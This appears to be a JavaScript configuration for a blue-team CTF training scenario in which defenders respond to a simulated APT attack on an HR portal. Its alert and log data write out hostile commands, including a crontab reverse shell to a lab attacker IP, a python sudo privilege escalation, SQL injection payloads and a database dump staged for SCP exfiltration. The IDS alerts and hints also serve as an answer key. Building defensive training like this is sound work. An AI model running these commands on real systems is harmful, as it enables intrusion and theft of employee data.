/* ============================================================
   CTF ARENA -- OPS-04: Operation Steel Wall
   Blue vs Blue | Parallel Defense | Coordinated APT Response
   Both teams defend identical networks against the same
   automated APT attack sequence. Fastest response wins.
   ============================================================ */

const OPS04Config = {

    // =====================================================
    // TOP-LEVEL METADATA
    // =====================================================

    id: 'ops-04-operation-steel-wall',
    title: 'Operation Steel Wall',

    // =====================================================
    // SHARED SCENARIO DATA
    // The automated APT attack that both teams face.
    // =====================================================

    _scenario: {
        aptGroupName:   'IRON VIPER',
        attackerIP:     '10.10.99.15',
        targetWebIP:    '10.10.14.30',
        targetWebHost:  'ironforge-web01',
        targetDBIP:     '10.10.14.31',
        targetDBHost:   'ironforge-db01',
        exfilIP:        '185.220.101.99',
        webPort:        80,
        sshPort:        22,
        mysqlPort:      3306,
        appName:        'IronForge HR Portal',
        appVersion:     '2.7.3',
        osRelease:      'Ubuntu 22.04.4 LTS',
        kernel:         '5.15.0-105-generic',
        dbName:         'ironforge_hr_db',
        stolenUser:     'svc_deploy',
        stolenPassword: 'Ir0nF0rge!Deploy#2024',

        // Attack phases (timed)
        phases: [
            {
                id: 'recon',
                name: 'Phase 1 -- Reconnaissance',
                window: '0:00 - 5:00',
                description: 'Port scan from 10.10.99.15 targeting ironforge-web01. SYN scan across common ports followed by service version enumeration on discovered services.'
            },
            {
                id: 'exploit',
                name: 'Phase 2 -- Initial Exploitation',
                window: '5:00 - 10:00',
                description: 'SQL injection against the HR Portal login page. Successful auth bypass leads to credential dump from ironforge_hr_db. Service account svc_deploy credentials extracted.'
            },
            {
                id: 'access',
                name: 'Phase 3 -- Persistence',
                window: '10:00 - 15:00',
                description: 'SSH login to ironforge-web01 using stolen svc_deploy credentials. Privilege escalation via misconfigured sudoers (NOPASSWD on /usr/bin/python3). Reverse shell planted.'
            },
            {
                id: 'lateral',
                name: 'Phase 4 -- Lateral Movement',
                window: '15:00 - 20:00',
                description: 'Internal pivot from ironforge-web01 to ironforge-db01 via SSH key found in /home/svc_deploy/.ssh/. MySQL dump of employee_records table initiated.'
            },
            {
                id: 'exfil',
                name: 'Phase 5 -- Exfiltration',
                window: '20:00 - 25:00',
                description: 'Data staged in /tmp/.cache_update/. Exfiltration via encrypted SCP to 185.220.101.99 (known bulletproof hosting). 4.2 MB of PII transferred.'
            }
        ],

        // Flag values for secure comparison in BoxEngine
        flags: {
            detect:   '{{FLAG:detect}}',
            identify: '{{FLAG:identify}}',
            contain:  '{{FLAG:contain}}',
            document: '{{FLAG:document}}'
        }
    },

    // =====================================================
    // ATTACK TIMELINE
    // Timestamped SIEM alerts both teams receive.
    // Offsets in seconds from match start.
    // =====================================================

    _attackTimeline: [
        // Phase 1: Recon (0-5 min)
        {
            offsetSec: 15,
            alert: {
                source: 'net-sensor-01',
                title: 'Port Scan Detected',
                severity: 'MEDIUM',
                message: 'SYN scan detected: 10.10.99.15 -> 10.10.14.30 (ports 22,80,443,3306,8080,8443)',
                srcIP: '10.10.99.15',
                dstIP: '10.10.14.30'
            }
        },
        {
            offsetSec: 45,
            alert: {
                source: 'net-sensor-01',
                title: 'Service Enumeration',
                severity: 'MEDIUM',
                message: 'Version scan: 10.10.99.15 probing 10.10.14.30:80 (Apache/2.4.57), :22 (OpenSSH_8.9p1), :3306 (MySQL 8.0.35)',
                srcIP: '10.10.99.15',
                dstIP: '10.10.14.30'
            }
        },
        {
            offsetSec: 120,
            alert: {
                source: 'apache-waf',
                title: 'Anomalous Request Rate',
                severity: 'LOW',
                message: '10.10.99.15 exceeded 60 req/min threshold on port 80. Directory enumeration pattern detected.',
                srcIP: '10.10.99.15',
                dstIP: '10.10.14.30'
            }
        },
        {
            offsetSec: 180,
            alert: {
                source: 'apache-waf',
                title: 'Directory Brute Force',
                severity: 'MEDIUM',
                message: 'Automated directory scan: /admin/, /backup/, /api/, /config/, /uploads/ from 10.10.99.15. 23 requests in 14 seconds.',
                srcIP: '10.10.99.15',
                dstIP: '10.10.14.30'
            }
        },

        // Phase 2: SQL Injection (5-10 min)
        {
            offsetSec: 310,
            alert: {
                source: 'apache-waf',
                title: 'SQL Injection Attempt',
                severity: 'HIGH',
                message: 'POST /login.php - Parameter "username" contains SQL metacharacters: \' OR 1=1-- from 10.10.99.15',
                srcIP: '10.10.99.15',
                dstIP: '10.10.14.30'
            }
        },
        {
            offsetSec: 340,
            alert: {
                source: 'apache-waf',
                title: 'SQL Injection -- Auth Bypass',
                severity: 'CRITICAL',
                message: 'Successful authentication bypass via SQLi on /login.php. Session created for user "admin" without valid credentials. Source: 10.10.99.15',
                srcIP: '10.10.99.15',
                dstIP: '10.10.14.30'
            }
        },
        {
            offsetSec: 400,
            alert: {
                source: 'db-monitor',
                title: 'Suspicious Database Query',
                severity: 'CRITICAL',
                message: 'UNION SELECT on ironforge_hr_db.users: SELECT username,password FROM users UNION SELECT table_name,NULL FROM information_schema.tables -- executed from web app context',
                srcIP: '10.10.14.30',
                dstIP: '10.10.14.30'
            }
        },
        {
            offsetSec: 450,
            alert: {
                source: 'db-monitor',
                title: 'Credential Dump Detected',
                severity: 'CRITICAL',
                message: 'Bulk read on ironforge_hr_db.users: all rows returned (47 records). Service account svc_deploy password hash extracted.',
                srcIP: '10.10.14.30',
                dstIP: '10.10.14.31'
            }
        },

        // Phase 3: SSH + Privesc (10-15 min)
        {
            offsetSec: 620,
            alert: {
                source: 'auth-monitor',
                title: 'SSH Login -- External Source',
                severity: 'HIGH',
                message: 'SSH authentication SUCCESS: svc_deploy@10.10.14.30 from 10.10.99.15 port 49221. Account normally authenticates from 10.10.14.0/24 only.',
                srcIP: '10.10.99.15',
                dstIP: '10.10.14.30'
            }
        },
        {
            offsetSec: 680,
            alert: {
                source: 'edr-agent-web01',
                title: 'Privilege Escalation Attempt',
                severity: 'CRITICAL',
                message: 'svc_deploy executed: sudo /usr/bin/python3 -c "import pty;pty.spawn(\'/bin/bash\')" -- root shell obtained via NOPASSWD sudoers misconfiguration',
                srcIP: '10.10.14.30',
                dstIP: '10.10.14.30'
            }
        },
        {
            offsetSec: 740,
            alert: {
                source: 'edr-agent-web01',
                title: 'Reverse Shell Planted',
                severity: 'CRITICAL',
                message: 'Crontab modified by root: new entry "* * * * * /bin/bash -c \'bash -i >& /dev/tcp/10.10.99.15/4444 0>&1\'" -- persistence mechanism detected',
                srcIP: '10.10.14.30',
                dstIP: '10.10.99.15'
            }
        },

        // Phase 4: Lateral Movement (15-20 min)
        {
            offsetSec: 920,
            alert: {
                source: 'edr-agent-web01',
                title: 'SSH Key Discovery',
                severity: 'HIGH',
                message: 'File read: /home/svc_deploy/.ssh/id_rsa by root process. Private key may be used for lateral movement.',
                srcIP: '10.10.14.30',
                dstIP: '10.10.14.30'
            }
        },
        {
            offsetSec: 960,
            alert: {
                source: 'net-sensor-02',
                title: 'Internal Lateral Movement',
                severity: 'HIGH',
                message: 'Internal SSH: 10.10.14.30 -> 10.10.14.31 (svc_deploy). Server-to-server authentication using key-based auth. Connection established.',
                srcIP: '10.10.14.30',
                dstIP: '10.10.14.31'
            }
        },
        {
            offsetSec: 1040,
            alert: {
                source: 'db-monitor',
                title: 'Full Database Dump Initiated',
                severity: 'CRITICAL',
                message: 'mysqldump executed on ironforge_hr_db: tables employee_records, payroll_data, ssn_vault. Output redirected to /tmp/.cache_update/hr_dump.sql (est. 4.2 MB)',
                srcIP: '10.10.14.31',
                dstIP: '10.10.14.31'
            }
        },

        // Phase 5: Exfiltration (20-25 min)
        {
            offsetSec: 1220,
            alert: {
                source: 'edr-agent-db01',
                title: 'Data Staging Detected',
                severity: 'HIGH',
                message: 'Hidden directory created: /tmp/.cache_update/. Files: hr_dump.sql (4.2 MB), svc_keys.tar.gz (12 KB). Compression and staging pattern matches exfil preparation.',
                srcIP: '10.10.14.31',
                dstIP: '10.10.14.31'
            }
        },
        {
            offsetSec: 1300,
            alert: {
                source: 'net-sensor-02',
                title: 'Outbound Exfiltration Attempt',
                severity: 'CRITICAL',
                message: 'SCP transfer: 10.10.14.31 -> 185.220.101.99:22. 4.2 MB outbound to known bulletproof hosting provider. DLP policy violation triggered.',
                srcIP: '10.10.14.31',
                dstIP: '185.220.101.99'
            }
        },
        {
            offsetSec: 1380,
            alert: {
                source: 'dlp-engine',
                title: 'PII Exfiltration Confirmed',
                severity: 'CRITICAL',
                message: 'DLP signature match: outbound file contains SSN patterns (XXX-XX-XXXX), employee names, salary data. 47 employee records at risk. Transfer to 185.220.101.99 in progress.',
                srcIP: '10.10.14.31',
                dstIP: '185.220.101.99'
            }
        }
    ],

    // =====================================================
    // MODES
    // Single blue mode -- both teams get this config.
    // =====================================================

    modes: {
        blue: {
            title: 'Operation Steel Wall',
            subtitle: 'SOC Defense Console -- IRON VIPER APT Response',
            difficulty: 'Intermediate',
            accent: '#2563eb',
            storageKey: 'hexworth_ctf_ops04',
            registryId: 'ops-04-operation-steel-wall',
            trackerKey: 'ctf_ops04',
            blueTeamMode: true,

            // -----------------------------------------
            // PHASES
            // -----------------------------------------

            phases: [
                {
                    id: 'detect',
                    name: 'Detection',
                    description: 'Identify that a coordinated attack is underway. Confirm anomalous behavior in the monitoring dashboard and correlate the initial alerts.',
                    requiredFlags: [],
                    mitre: ['TA0009', 'DS0015', 'DS0029'],
                    unlocks: ['identify'],
                    locked: false
                },
                {
                    id: 'identify',
                    name: 'Identification',
                    description: 'Determine the attack vector and scope. Find the SQL injection evidence and credential compromise in the logs.',
                    requiredFlags: ['detect'],
                    mitre: ['TA0001', 'T1190', 'T1078'],
                    unlocks: ['contain'],
                    locked: true
                },
                {
                    id: 'contain',
                    name: 'Containment',
                    description: 'Block the attacker IP, isolate compromised hosts, and prevent data exfiltration to the C2 server.',
                    requiredFlags: ['identify'],
                    mitre: ['TA0042', 'T1562.004'],
                    unlocks: ['document'],
                    locked: true
                },
                {
                    id: 'document',
                    name: 'Documentation',
                    description: 'Classify all IDS alerts, document the full attack chain, and complete the incident report.',
                    requiredFlags: ['contain'],
                    mitre: ['TA0040'],
                    unlocks: [],
                    locked: true
                }
            ],

            // -----------------------------------------
            // TUTORIAL
            // -----------------------------------------

            tutorialMode: true,

            tutorial: {
                steps: [
                    {
                        title: 'Open the Monitoring Dashboard',
                        tip: 'Start by reviewing the live event feed. Alerts will appear in real time as the APT attack progresses. Watch for the first scan alerts.',
                        trigger: { event: 'window_open', match: { type: 'monitoring' } }
                    },
                    {
                        title: 'Check the Log Viewer',
                        tip: 'Open the Log Viewer. Filter for source IP "10.10.99.15" to isolate attacker activity from normal traffic.',
                        trigger: { event: 'window_open', match: { type: 'logs' } }
                    },
                    {
                        title: 'Confirm the Attack',
                        tip: 'Look for SQL injection patterns in the web logs -- POST requests to /login.php with SQL metacharacters prove the initial vector.',
                        trigger: { event: 'flag_correct', match: { flagId: 'detect' } }
                    },
                    {
                        title: 'Block the Threat',
                        tip: 'Open the Firewall Manager. Add DROP rules for the attacker IP (10.10.99.15) and the exfil destination (185.220.101.99).',
                        trigger: { event: 'flag_correct', match: { flagId: 'identify' } }
                    },
                    {
                        title: 'Classify IDS Alerts',
                        tip: 'Open the IDS Panel. Each alert must be classified as True Positive, False Positive, or Needs Investigation. Get them all right to complete documentation.',
                        trigger: { event: 'flag_correct', match: { flagId: 'contain' } }
                    }
                ]
            },

            // -----------------------------------------
            // CERT OBJECTIVES
            // -----------------------------------------

            certObjectives: {
                certPath: 'SY0-701',
                mappings: [
                    { flagId: 'detect',   objective: '4.3', description: 'Explain various activities associated with vulnerability management', skill: 'SIEM Alert Correlation -- APT Detection' },
                    { flagId: 'identify', objective: '4.9', description: 'Given a scenario, implement security awareness practices -- incident log review', skill: 'SQL Injection Identification and Evidence Collection' },
                    { flagId: 'contain',  objective: '4.4', description: 'Explain security alerting and monitoring concepts -- firewall rules', skill: 'Network Containment -- Multi-Host Isolation' },
                    { flagId: 'document', objective: '4.8', description: 'Explain appropriate incident response activities', skill: 'IDS Alert Triage and Incident Documentation' }
                ]
            },

            // -----------------------------------------
            // BOOT
            // -----------------------------------------

            boot: {
                biosLines: [
                    'Dell PowerEdge R640 BIOS v2.20.1',
                    'Initializing hardware...',
                    'Memory Test: 65536 MB OK',
                    'iDRAC9: Network interface ready',
                    'Boot device: /dev/sda1 (Ubuntu 22.04)',
                    'Loading GRUB...'
                ],
                grubEntries: [
                    'Ubuntu 22.04.4 LTS (SOC Analyst Workstation)',
                    'Ubuntu 22.04.4 LTS (recovery mode)'
                ],
                loginUser: 'soc-analyst'
            },

            // -----------------------------------------
            // DESKTOP
            // -----------------------------------------

            desktop: {
                icons: [
                    { id: 'monitoring', label: 'Monitoring',  icon: '\uD83D\uDCCA', app: 'monitoring' },
                    { id: 'logs',       label: 'Log Viewer',  icon: '\uD83D\uDCCB', app: 'logviewer'  },
                    { id: 'firewall',   label: 'Firewall',    icon: '\uD83D\uDD25', app: 'firewall'   },
                    { id: 'ids',        label: 'IDS Panel',   icon: '\uD83D\uDEA8', app: 'ids'        },
                    { id: 'hints',      label: 'Hints',       icon: '\uD83D\uDCA1', app: 'hints'      },
                    { id: 'flags',      label: 'Submit Flag', icon: '\uD83D\uDEA9', app: 'flags'      }
                ]
            },

            // -----------------------------------------
            // FLAGS
            // -----------------------------------------

            flags: [
                { id: 'detect',   points: 100 },
                { id: 'identify', points: 150 },
                { id: 'contain',  points: 200 },
                { id: 'document', points: 150 }
            ],

            // -----------------------------------------
            // SCORING
            // -----------------------------------------

            scoring: {
                base: 1000,
                maxScore: 600,
                hintPenalty: true,
                wrongFlagPenalty: -25,
                speedBonus: { threshold: 1500000, points: 150 },
                timeBonusThreshold: 1800
            },

            // -----------------------------------------
            // HINTS
            // -----------------------------------------

            hints: [
                {
                    id: 'hint_detect',
                    text: 'The monitoring dashboard will show alerts arriving in real time. The first wave is a port scan from 10.10.99.15 -- look for SYN scan signatures and service enumeration patterns.',
                    cost: 10,
                    penalty: -10
                },
                {
                    id: 'hint_sqli',
                    text: 'In the Log Viewer, filter by source "10.10.99.15" and look for POST requests to /login.php. The SQL injection uses a classic auth bypass: \' OR 1=1-- in the username field.',
                    cost: 25,
                    penalty: -25
                },
                {
                    id: 'hint_firewall',
                    text: 'Add DROP rules in Firewall Manager: (1) INPUT chain, Source 10.10.99.15/32, Action DROP to block the attacker. (2) FORWARD chain, Destination 185.220.101.99/32, Action DROP to block exfiltration.',
                    cost: 40,
                    penalty: -40
                },
                {
                    id: 'hint_ids',
                    text: 'True Positives: PORT-SCAN, SQLI-AUTH-BYPASS, CREDENTIAL-DUMP, SSH-EXTERNAL, PRIV-ESC, LATERAL-SSH, DATA-EXFIL. False Positives: GOOGLEBOT-CRAWL, CRON-CERTBOT. Investigate: ANOMALOUS-OUTBOUND.',
                    cost: 50,
                    penalty: -50
                }
            ],

            // -----------------------------------------
            // LORE
            // -----------------------------------------

            lore: {
                intro: 'FLASH ALERT: APT group IRON VIPER has launched a coordinated attack against IronForge Industries. Both SOC teams are seeing identical attack patterns on their network segments. This is a race -- the team that detects, contains, and documents fastest proves they are the superior defenders. Your SIEM is live. Alerts are incoming. Move.',
                scenario: 'IRON VIPER follows a textbook kill chain: reconnaissance, exploitation, persistence, lateral movement, exfiltration. They hit the HR Portal with SQL injection, stole service account credentials, pivoted to the database server, and are staging employee PII for exfiltration. Both teams see the same attack at the same time. Speed and accuracy determine the winner.',
                outro: 'Threat contained. IRON VIPER\'s exfiltration was blocked before completion. Incident fully documented. Your SOC team\'s response time and accuracy have been recorded for scoring.',
                ecer: {
                    executive: 'HR Portal running outdated framework with known SQLi vulnerabilities -- patch delayed due to "business requirements"',
                    culture:   'Service accounts shared across teams with no rotation policy -- svc_deploy password unchanged for 18 months',
                    employee:  'DBA stored SSH private keys in home directory with default permissions (644)',
                    regulatory: 'No network segmentation between web tier and database tier -- flat network violates PCI DSS requirement 1.3'
                }
            },

            // -----------------------------------------
            // MONITORING DASHBOARD DATA
            // Initial state before the automated timeline
            // starts pushing live alerts.
            // -----------------------------------------

            monitoring: {
                traffic: [
                    { value: 8,   label: '09:00' },
                    { value: 11,  label: '09:05' },
                    { value: 9,   label: '09:10' },
                    { value: 13,  label: '09:15' },
                    { value: 10,  label: '09:20' },
                    { value: 12,  label: '09:25' },
                    { value: 14,  label: '09:30' },
                    { value: 11,  label: '09:35' },
                    { value: 10,  label: '09:40' },
                    { value: 9,   label: '09:45' },
                    { value: 15,  label: '09:50' },
                    { value: 12,  label: '09:55' }
                ],

                events: [
                    { timestamp: '09:30:12', source: 'syslog',         message: 'CRON[4102]: (root) CMD (/usr/bin/certbot renew --quiet)' },
                    { timestamp: '09:42:08', source: 'apache/access',  message: '192.168.1.60 - - "GET / HTTP/1.1" 200 4821 "-" "Mozilla/5.0"' },
                    { timestamp: '09:48:33', source: 'apache/access',  message: '203.0.113.44 - - "GET /sitemap.xml HTTP/1.1" 200 3291 "-" "Googlebot"' },
                    { timestamp: '09:55:01', source: 'auth/sshd',      message: 'Accepted publickey for deploy_mgr from 192.168.1.10 port 41892 ssh2' }
                ],

                alerts: [
                    { name: 'CRON-CERTBOT',       severity: 'low',    sourceIP: '10.10.14.30',   description: 'Scheduled certbot renewal task executed by root crontab. Normal maintenance activity.' },
                    { name: 'GOOGLEBOT-CRAWL',     severity: 'low',    sourceIP: '203.0.113.44',  description: 'Googlebot crawling /sitemap.xml. IP verified within Google ASN (AS15169). Normal.' }
                ]
            },

            // -----------------------------------------
            // LOG VIEWER DATA
            // Baseline logs. Attack entries are injected
            // by the timeline engine during the match.
            // -----------------------------------------

            logViewer: {
                entries: [
                    // Normal baseline traffic
                    { timestamp: '2024-06-12 09:30:12', severity: 'info',    source: 'syslog',         message: 'CRON[4102]: (root) CMD (/usr/bin/certbot renew --quiet)' },
                    { timestamp: '2024-06-12 09:35:44', severity: 'info',    source: 'apache/access',  message: '192.168.1.55 - - "GET /dashboard HTTP/1.1" 200 8412 "-" "Mozilla/5.0"' },
                    { timestamp: '2024-06-12 09:38:21', severity: 'info',    source: 'apache/access',  message: '192.168.1.60 - - "GET / HTTP/1.1" 200 4821 "-" "Mozilla/5.0"' },
                    { timestamp: '2024-06-12 09:42:08', severity: 'info',    source: 'apache/access',  message: '192.168.1.61 - - "GET /employees HTTP/1.1" 200 12044 "-" "Mozilla/5.0"' },
                    { timestamp: '2024-06-12 09:48:33', severity: 'info',    source: 'apache/access',  message: '203.0.113.44 - - "GET /sitemap.xml HTTP/1.1" 200 3291 "-" "Googlebot"' },
                    { timestamp: '2024-06-12 09:55:01', severity: 'info',    source: 'auth/sshd',      message: 'Accepted publickey for deploy_mgr from 192.168.1.10 port 41892 ssh2' },

                    // Attack entries -- Phase 1: Recon
                    { timestamp: '2024-06-12 10:00:15', severity: 'warning', source: 'net-sensor',     message: 'SYN_SCAN: src=10.10.99.15 dst=10.10.14.30 ports=[22,80,443,3306,8080,8443] duration=12.1s', suspicious: true },
                    { timestamp: '2024-06-12 10:00:45', severity: 'warning', source: 'net-sensor',     message: 'VERSION_SCAN: src=10.10.99.15 dst=10.10.14.30 services=[Apache/2.4.57,OpenSSH_8.9p1,MySQL_8.0.35]', suspicious: true },
                    { timestamp: '2024-06-12 10:02:00', severity: 'warning', source: 'apache/access',  message: '10.10.99.15 - - "GET /robots.txt HTTP/1.1" 200 154', suspicious: true },
                    { timestamp: '2024-06-12 10:03:00', severity: 'warning', source: 'apache/access',  message: '10.10.99.15 - - "GET /admin/ HTTP/1.1" 403 276', suspicious: true },
                    { timestamp: '2024-06-12 10:03:08', severity: 'warning', source: 'apache/access',  message: '10.10.99.15 - - "GET /backup/ HTTP/1.1" 403 276', suspicious: true },
                    { timestamp: '2024-06-12 10:03:14', severity: 'warning', source: 'apache/access',  message: '10.10.99.15 - - "GET /config/ HTTP/1.1" 403 276', suspicious: true },
                    { timestamp: '2024-06-12 10:03:22', severity: 'warning', source: 'apache/access',  message: '10.10.99.15 - - "GET /api/ HTTP/1.1" 200 89', suspicious: true },
                    { timestamp: '2024-06-12 10:03:30', severity: 'warning', source: 'apache/access',  message: '10.10.99.15 - - "GET /uploads/ HTTP/1.1" 200 0', suspicious: true },

                    // Phase 2: SQL Injection
                    { timestamp: '2024-06-12 10:05:10', severity: 'err',     source: 'apache/access',  message: '10.10.99.15 - - "POST /login.php HTTP/1.1" 200 1842 -- username=\' OR 1=1--', suspicious: true },
                    { timestamp: '2024-06-12 10:05:40', severity: 'crit',    source: 'apache/access',  message: '10.10.99.15 - - "POST /login.php HTTP/1.1" 302 0 -- SQLi auth bypass successful, session=admin', suspicious: true },
                    { timestamp: '2024-06-12 10:06:40', severity: 'crit',    source: 'mysql/query',    message: 'SELECT username,password FROM users UNION SELECT table_name,NULL FROM information_schema.tables -- [ironforge_hr_db]', suspicious: true },
                    { timestamp: '2024-06-12 10:07:30', severity: 'crit',    source: 'mysql/query',    message: 'SELECT * FROM users -- 47 rows returned. Includes svc_deploy hash: $2y$10$... [ironforge_hr_db]', suspicious: true },

                    // Phase 3: SSH + Privesc
                    { timestamp: '2024-06-12 10:10:20', severity: 'crit',    source: 'auth/sshd',      message: 'Accepted password for svc_deploy from 10.10.99.15 port 49221 ssh2', suspicious: true },
                    { timestamp: '2024-06-12 10:11:20', severity: 'crit',    source: 'auth/sudo',      message: 'svc_deploy : TTY=pts/1 ; PWD=/home/svc_deploy ; USER=root ; COMMAND=/usr/bin/python3 -c import pty;pty.spawn(\'/bin/bash\')', suspicious: true },
                    { timestamp: '2024-06-12 10:12:20', severity: 'crit',    source: 'edr/crontab',    message: 'Crontab modified by root: added reverse shell to 10.10.99.15:4444 -- persistence planted', suspicious: true },

                    // Normal noise
                    { timestamp: '2024-06-12 10:13:00', severity: 'info',    source: 'apache/access',  message: '192.168.1.62 - - "GET /dashboard HTTP/1.1" 200 8412 "-" "Mozilla/5.0"' },
                    { timestamp: '2024-06-12 10:14:30', severity: 'info',    source: 'syslog',         message: 'systemd[1]: Started Daily apt download activities.' },

                    // Phase 4: Lateral Movement
                    { timestamp: '2024-06-12 10:15:20', severity: 'crit',    source: 'edr/file',       message: 'File read by root: /home/svc_deploy/.ssh/id_rsa (private key) -- possible lateral movement prep', suspicious: true },
                    { timestamp: '2024-06-12 10:16:00', severity: 'crit',    source: 'auth/sshd',      message: 'Accepted publickey for svc_deploy from 10.10.14.30 port 52108 ssh2 [ironforge-db01]', suspicious: true },
                    { timestamp: '2024-06-12 10:17:20', severity: 'crit',    source: 'mysql/query',    message: 'mysqldump ironforge_hr_db employee_records payroll_data ssn_vault > /tmp/.cache_update/hr_dump.sql -- 4.2 MB', suspicious: true },

                    // Phase 5: Exfiltration
                    { timestamp: '2024-06-12 10:20:20', severity: 'crit',    source: 'edr/file',       message: 'Hidden directory: /tmp/.cache_update/ created by svc_deploy. Contents: hr_dump.sql (4.2MB), svc_keys.tar.gz (12KB)', suspicious: true },
                    { timestamp: '2024-06-12 10:21:40', severity: 'crit',    source: 'net-sensor',     message: 'Outbound SCP: src=10.10.14.31:52441 dst=185.220.101.99:22 bytes=4404019 duration=3.2s', suspicious: true },
                    { timestamp: '2024-06-12 10:23:00', severity: 'crit',    source: 'dlp-engine',     message: 'DLP ALERT: Outbound transfer to 185.220.101.99 contains SSN patterns (XXX-XX-XXXX), employee PII. 47 records at risk.', suspicious: true }
                ]
            },

            // -----------------------------------------
            // FIREWALL MANAGER DATA
            // Starts permissive. Student must add blocks.
            // -----------------------------------------

            firewall: {
                rules: [
                    { chain: 'INPUT',   src: '0.0.0.0/0',      dst: '10.10.14.30', port: '80',   protocol: 'tcp', action: 'ACCEPT' },
                    { chain: 'INPUT',   src: '0.0.0.0/0',      dst: '10.10.14.30', port: '22',   protocol: 'tcp', action: 'ACCEPT' },
                    { chain: 'INPUT',   src: '0.0.0.0/0',      dst: '10.10.14.30', port: '3306', protocol: 'tcp', action: 'ACCEPT' },
                    { chain: 'INPUT',   src: '0.0.0.0/0',      dst: '10.10.14.30', port: 'any',  protocol: 'any', action: 'ACCEPT' },
                    { chain: 'OUTPUT',  src: '10.10.14.0/24',   dst: '0.0.0.0/0',   port: 'any',  protocol: 'any', action: 'ACCEPT' },
                    { chain: 'FORWARD', src: '10.10.14.0/24',   dst: '0.0.0.0/0',   port: 'any',  protocol: 'any', action: 'ACCEPT' }
                ]
            },

            // -----------------------------------------
            // IDS PANEL DATA
            // Mix of true positives, false positives,
            // and ambiguous alerts for classification.
            // -----------------------------------------

            ids: {
                alerts: [
                    {
                        sid: 'SW-7001',
                        signature: 'ET SCAN Nmap SYN Scan Detected',
                        severity: 'medium',
                        timestamp: '2024-06-12 10:00:15',
                        srcIP: '10.10.99.15', dstIP: '10.10.14.30', dstPort: 0,
                        detail: 'Multiple SYN packets to 6 ports from single source in 12-second window. Pattern matches Nmap default SYN scan with version detection enabled.',
                        correctClassification: 'tp',
                        mitre: 'T1046'
                    },
                    {
                        sid: 'SW-7002',
                        signature: 'ET WEB_SERVER SQL Injection Auth Bypass',
                        severity: 'critical',
                        timestamp: '2024-06-12 10:05:10',
                        srcIP: '10.10.99.15', dstIP: '10.10.14.30', dstPort: 80,
                        detail: 'POST /login.php with SQL metacharacters in username parameter: \' OR 1=1--. Server returned HTTP 302 redirect to /dashboard -- authentication bypass confirmed.',
                        correctClassification: 'tp',
                        mitre: 'T1190'
                    },
                    {
                        sid: 'SW-7003',
                        signature: 'ET WEB_SERVER UNION SELECT Database Enumeration',
                        severity: 'critical',
                        timestamp: '2024-06-12 10:06:40',
                        srcIP: '10.10.14.30', dstIP: '10.10.14.30', dstPort: 3306,
                        detail: 'UNION-based SQL injection extracting table names from information_schema. Followed by full credential dump from users table (47 rows). Attack originating from web application context.',
                        correctClassification: 'tp',
                        mitre: 'T1505'
                    },
                    {
                        sid: 'SW-7004',
                        signature: 'ET POLICY SSH Login from External Network',
                        severity: 'high',
                        timestamp: '2024-06-12 10:10:20',
                        srcIP: '10.10.99.15', dstIP: '10.10.14.30', dstPort: 22,
                        detail: 'SSH password authentication for svc_deploy from external IP 10.10.99.15. This service account normally authenticates only from 10.10.14.0/24 internal subnet.',
                        correctClassification: 'tp',
                        mitre: 'T1078.001'
                    },
                    {
                        sid: 'SW-7005',
                        signature: 'ET EXPLOIT Sudo Privilege Escalation via Python',
                        severity: 'critical',
                        timestamp: '2024-06-12 10:11:20',
                        srcIP: '10.10.14.30', dstIP: '10.10.14.30', dstPort: 0,
                        detail: 'svc_deploy executed sudo /usr/bin/python3 with pty.spawn to obtain interactive root shell. NOPASSWD entry in sudoers for python3 exploited. Root session now active.',
                        correctClassification: 'tp',
                        mitre: 'T1548.003'
                    },
                    {
                        sid: 'SW-7006',
                        signature: 'ET POLICY Internal Lateral SSH Movement',
                        severity: 'high',
                        timestamp: '2024-06-12 10:16:00',
                        srcIP: '10.10.14.30', dstIP: '10.10.14.31', dstPort: 22,
                        detail: 'Internal SSH from web server to database server using stolen private key. Server-to-server lateral movement pattern. Key-based auth -- no password prompt.',
                        correctClassification: 'tp',
                        mitre: 'T1021.004'
                    },
                    {
                        sid: 'SW-7007',
                        signature: 'ET EXFIL Outbound SCP to Known Bad IP',
                        severity: 'critical',
                        timestamp: '2024-06-12 10:21:40',
                        srcIP: '10.10.14.31', dstIP: '185.220.101.99', dstPort: 22,
                        detail: 'SCP transfer of 4.2 MB from database server to 185.220.101.99. Destination IP associated with bulletproof hosting provider. DLP signature matches employee PII patterns.',
                        correctClassification: 'tp',
                        mitre: 'T1041'
                    },
                    {
                        sid: 'SW-7008',
                        signature: 'ET POLICY Googlebot User-Agent Detected',
                        severity: 'low',
                        timestamp: '2024-06-12 09:48:33',
                        srcIP: '203.0.113.44', dstIP: '10.10.14.30', dstPort: 80,
                        detail: 'Request from IP 203.0.113.44 with Googlebot user-agent to /sitemap.xml. IP is within Google ASN range (AS15169). Normal crawl behavior.',
                        correctClassification: 'fp',
                        mitre: null
                    },
                    {
                        sid: 'SW-7009',
                        signature: 'ET POLICY Certbot Renewal Cron Execution',
                        severity: 'low',
                        timestamp: '2024-06-12 09:30:12',
                        srcIP: '10.10.14.30', dstIP: '10.10.14.30', dstPort: 0,
                        detail: 'Scheduled certbot renewal executed via root crontab. Certificate renewal is a standard maintenance task. No anomaly detected.',
                        correctClassification: 'fp',
                        mitre: null
                    },
                    {
                        sid: 'SW-7010',
                        signature: 'ET POLICY Outbound Connection on Non-Standard Port',
                        severity: 'medium',
                        timestamp: '2024-06-12 10:12:45',
                        srcIP: '10.10.14.30', dstIP: '10.10.99.15', dstPort: 4444,
                        detail: 'Outbound TCP connection from web server to 10.10.99.15:4444. Could be reverse shell callback or legitimate application traffic. Port 4444 is commonly associated with Metasploit default handler.',
                        correctClassification: 'inv',
                        mitre: 'T1571'
                    }
                ]
            }
        }
    }
};
